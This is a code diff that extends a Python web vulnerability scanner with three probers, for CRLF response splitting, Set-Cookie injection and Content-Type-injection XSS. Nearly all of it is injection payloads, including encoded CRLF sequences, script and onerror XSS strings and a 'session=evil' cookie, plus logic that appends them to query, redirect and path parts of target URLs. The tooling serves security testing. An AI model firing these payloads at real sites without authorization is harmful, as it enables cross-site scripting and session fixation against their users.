@@ -173,10 +173,13 @@ class CRLFScanner(BaseScanner):
     def run(self, target: str, urls: Optional[List[str]] = None, **kwargs) -> List[Dict]:
         endpoints = urls or [target]
         all_results: List[Dict] = []
-        header_prober   = HeaderInjectionProber()
-        split_exploiter = ResponseSplittingExploiter()
-        cache_chain     = CachePoisoningChain()
-        log_chain       = LogPoisoningChain()
+        header_prober    = HeaderInjectionProber()
+        split_exploiter  = ResponseSplittingExploiter()
+        cache_chain      = CachePoisoningChain()
+        log_chain        = LogPoisoningChain()
+        split_prober     = CRLFResponseSplittingProber(session=self.session, results=self.results)
+        cookie_prober    = CRLFCookieInjectionProber(session=self.session, results=self.results)
+        xss_prober       = CRLFXSSProber(session=self.session, results=self.results)
 
         for url in endpoints:
             logger.info("[CRLFScanner] Scanning: %s", url)
@@ -199,6 +202,13 @@ class CRLFScanner(BaseScanner):
             if log:
                 self.report_finding(**log)
                 all_results.append(log)
+            # New advanced probers
+            for r in split_prober.probe(url):
+                all_results.append(r)
+            for r in cookie_prober.probe(url):
+                all_results.append(r)
+            for r in xss_prober.probe(url):
+                all_results.append(r)
 
         return all_results
 
@@ -375,4 +385,311 @@ class LogPoisoningChain:
                         return {"lfi_url": lfi_url, "log_path": log_path, "body_snippet": body[:300]}
                 except Exception:
                     pass
+        return None
+
+
+# ===========================================================================
+# CRLFResponseSplittingProber — HTTP response splitting via double CRLF
+# ===========================================================================
+
+class CRLFResponseSplittingProber(BaseScanner):
+    """
+    URL parametrelerine, path'e ve header degerlerine double CRLF inject ederek
+    HTTP response splitting ve XSS zinciri tespiti yapar.
+
+    Severity:
+      - Enjekte edilen header yanıtta görünüyorsa: High
+      - XSS payload body'de yansıdıysa: Critical
+    """
+
+    name = "crlf_splitting"
+
+    _SPLIT_PAYLOADS: List[Tuple[str, str]] = [
+        (
+            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK"
+            "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
+            "full_split_xss",
+        ),
+        (
+            "%0d%0aSet-Cookie: session=evil; Path=/",
+            "cookie_inject_via_split",
+        ),
+        (
+            "%0d%0aX-Injected: crlf_wsp_marker",
+            "header_inject_minimal",
+        ),
+    ]
+
+    _INJECT_PARAMS = [
+        "url", "redirect", "next", "goto", "dest", "location",
+        "return", "path", "ref", "continue", "callback",
+    ]
+
+    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
+        results: List[Dict] = []
+        parsed   = urllib.parse.urlparse(url)
+        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+
+        for raw_payload, technique in self._SPLIT_PAYLOADS:
+            # 1. Inject into existing query params
+            if qs_pairs:
+                param, orig = qs_pairs[0]
+                new_pairs = [(k, orig + raw_payload if k == param else v) for k, v in qs_pairs]
+                test_url = urllib.parse.urlunparse(parsed._replace(
+                    query=urllib.parse.urlencode(new_pairs, safe="%")))
+                finding = self._send_and_check(test_url, raw_payload, technique, timeout)
+                if finding:
+                    self.report_finding(**finding)
+                    results.append(finding)
+                    continue
+
+            # 2. Inject via known redirect params
+            for inject_param in self._INJECT_PARAMS:
+                sep = "&" if parsed.query else ""
+                extra_qs = parsed.query + sep + f"{inject_param}={raw_payload}" if parsed.query else f"{inject_param}={raw_payload}"
+                test_url = urllib.parse.urlunparse(parsed._replace(query=extra_qs))
+                finding = self._send_and_check(test_url, raw_payload, technique, timeout)
+                if finding:
+                    self.report_finding(**finding)
+                    results.append(finding)
+                    break
+
+            # 3. Inject into path
+            path_inj  = parsed.path.rstrip("/") + "/" + urllib.parse.quote(raw_payload, safe="%")
+            test_url  = urllib.parse.urlunparse(parsed._replace(path=path_inj))
+            finding   = self._send_and_check(test_url, raw_payload, technique, timeout, check_path=True)
+            if finding:
+                self.report_finding(**finding)
+                results.append(finding)
+
+        return results
+
+    def _send_and_check(
+        self, test_url: str, payload: str, technique: str,
+        timeout: int, check_path: bool = False,
+    ) -> Optional[Dict]:
+        try:
+            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
+        except Exception as exc:
+            logger.debug("[CRLFResponseSplittingProber] %s", exc)
+            return None
+
+        body    = getattr(resp, "text", "")[:4000]
+        raw_hdr = str(getattr(resp, "headers", {}))
+
+        xss_markers = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
+        for marker in xss_markers:
+            if marker in body:
+                return {
+                    "vuln_type": "HTTP Response Splitting → XSS",
+                    "url": test_url,
+                    "severity": "Critical",
+                    "description": (
+                        f"CRLF response splitting via '{technique}': XSS payload reflected in body."
+                    ),
+                    "evidence": {
+                        "technique": technique,
+                        "payload_snippet": payload[:80],
+                        "body_snippet": body[:300],
+                        "status_code": resp.status_code,
+                    },
+                }
+
+        if "x-injected" in raw_hdr.lower() or "crlf_wsp_marker" in raw_hdr:
+            return {
+                "vuln_type": "HTTP Response Splitting (Header Injection)",
+                "url": test_url,
+                "severity": "High",
+                "description": (
+                    f"CRLF response splitting via '{technique}': injected header reflected in response."
+                ),
+                "evidence": {
+                    "technique": technique,
+                    "payload_snippet": payload[:80],
+                    "response_headers": dict(list(getattr(resp, "headers", {}).items())[:10]),
+                    "status_code": resp.status_code,
+                },
+            }
+        return None
+
+
+# ===========================================================================
+# CRLFCookieInjectionProber — Set-Cookie injection via CRLF
+# ===========================================================================
+
+class CRLFCookieInjectionProber(BaseScanner):
+    """
+    CRLF aracılığıyla Set-Cookie header enjeksiyonu.
+    Yanıtta crlf_test=injected cookie'si varsa High severity.
+    """
+
+    name = "crlf_cookie"
+
+    _COOKIE_PAYLOADS: List[str] = [
+        "%0d%0aSet-Cookie: crlf_test=injected; Path=/; HttpOnly",
+        "%0a%0aSet-Cookie: crlf_test=injected; Path=/",
+        "%0d%0aSet-Cookie: crlf_test=injected",
+        "%E5%98%8A%E5%98%8DSet-Cookie: crlf_test=injected; Path=/",
+        "%250d%250aSet-Cookie: crlf_test=injected; Path=/",
+    ]
+
+    _INJECT_PARAMS = [
+        "url", "redirect", "next", "return", "goto",
+        "dest", "location", "path", "continue",
+    ]
+
+    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
+        results: List[Dict] = []
+        parsed   = urllib.parse.urlparse(url)
+        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+
+        for payload in self._COOKIE_PAYLOADS:
+            test_urls: List[str] = []
+
+            # Inject into existing params
+            if qs_pairs:
+                param, orig = qs_pairs[0]
+                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
+                test_urls.append(urllib.parse.urlunparse(parsed._replace(
+                    query=urllib.parse.urlencode(new_pairs, safe="%"))))
+
+            # Inject via redirect params
+            for inject_param in self._INJECT_PARAMS:
+                sep = "&" if parsed.query else ""
+                extra_qs = parsed.query + sep + f"{inject_param}={payload}" if parsed.query else f"{inject_param}={payload}"
+                test_urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
+                break  # one param per payload is enough
+
+            for test_url in test_urls:
+                finding = self._send_and_check(test_url, payload, timeout)
+                if finding:
+                    self.report_finding(**finding)
+                    results.append(finding)
+                    break  # early exit on first confirmed hit per payload
+
+        return results
+
+    def _send_and_check(self, test_url: str, payload: str, timeout: int) -> Optional[Dict]:
+        try:
+            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
+        except Exception as exc:
+            logger.debug("[CRLFCookieInjectionProber] %s", exc)
+            return None
+
+        raw_hdrs = str(getattr(resp, "headers", {}))
+        cookies  = getattr(resp, "cookies", {})
+
+        cookie_injected = (
+            cookies.get("crlf_test") == "injected"
+            or "crlf_test=injected" in raw_hdrs
+        )
+        if cookie_injected:
+            return {
+                "vuln_type": "CRLF Injection → Cookie Injection",
+                "url": test_url,
+                "severity": "High",
+                "description": (
+                    "CRLF injection confirmed via Set-Cookie header: "
+                    "'crlf_test=injected' reflected in server response."
+                ),
+                "evidence": {
+                    "payload_snippet": payload[:80],
+                    "cookie_value": cookies.get("crlf_test", ""),
+                    "response_headers": dict(list(getattr(resp, "headers", {}).items())[:10]),
+                    "status_code": resp.status_code,
+                },
+            }
+        return None
+
+
+# ===========================================================================
+# CRLFXSSProber — Content-Type injection leading to XSS via CRLF
+# ===========================================================================
+
+class CRLFXSSProber(BaseScanner):
+    """
+    CRLF aracılığıyla Content-Type: text/html header enjeksiyonu ve ardından
+    XSS payload yansıması. Body'de payload varsa Critical severity.
+    """
+
+    name = "crlf_xss"
+
+    _XSS_PAYLOADS: List[str] = [
+        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>",
+        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.domain)</script>",
+        "%0a%0aContent-Type: text/html%0a%0a<svg onload=alert(1)>",
+        "%E5%98%8A%E5%98%8DContent-Type: text/html%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<img src=x onerror=alert(1)>",
+    ]
+
+    _XSS_MARKERS = [
+        "<img src=x onerror=alert(1)>",
+        "<script>alert(document.domain)</script>",
+        "<svg onload=alert(1)>",
+    ]
+
+    _INJECT_PARAMS = [
+        "url", "redirect", "next", "return", "goto",
+        "dest", "location", "path", "continue",
+    ]
+
+    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
+        results: List[Dict] = []
+        parsed   = urllib.parse.urlparse(url)
+        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+
+        for payload in self._XSS_PAYLOADS:
+            test_urls: List[str] = []
+
+            # Inject into existing params
+            if qs_pairs:
+                param, orig = qs_pairs[0]
+                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
+                test_urls.append(urllib.parse.urlunparse(parsed._replace(
+                    query=urllib.parse.urlencode(new_pairs, safe="%"))))
+
+            # Inject via path
+            path_inj = parsed.path.rstrip("/") + "/" + urllib.parse.quote(payload, safe="%")
+            test_urls.append(urllib.parse.urlunparse(parsed._replace(path=path_inj)))
+
+            # Inject via redirect params
+            for inject_param in self._INJECT_PARAMS:
+                sep = "&" if parsed.query else ""
+                extra_qs = parsed.query + sep + f"{inject_param}={payload}" if parsed.query else f"{inject_param}={payload}"
+                test_urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
+                break
+
+            for test_url in test_urls:
+                finding = self._send_and_check(test_url, payload, timeout)
+                if finding:
+                    self.report_finding(**finding)
+                    results.append(finding)
+                    break  # early exit per payload
+
+        return results
+
+    def _send_and_check(self, test_url: str, payload: str, timeout: int) -> Optional[Dict]:
+        try:
+            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
+        except Exception as exc:
+            logger.debug("[CRLFXSSProber] %s", exc)
+            return None
+
+        body = getattr(resp, "text", "")[:4000]
+        for marker in self._XSS_MARKERS:
+            if marker in body:
+                return {
+                    "vuln_type": "CRLF Injection → XSS (Content-Type Injection)",
+                    "url": test_url,
+                    "severity": "Critical",
+                    "description": (
+                        "CRLF injection used to inject 'Content-Type: text/html' header followed "
+                        "by XSS payload. Payload reflected in response body — XSS confirmed."
+                    ),
+                    "evidence": {
+                        "payload_snippet": payload[:80],
+                        "xss_marker": marker,
+                        "body_snippet": body[:300],
+                        "status_code": resp.status_code,
+                    },
+                }
         return None
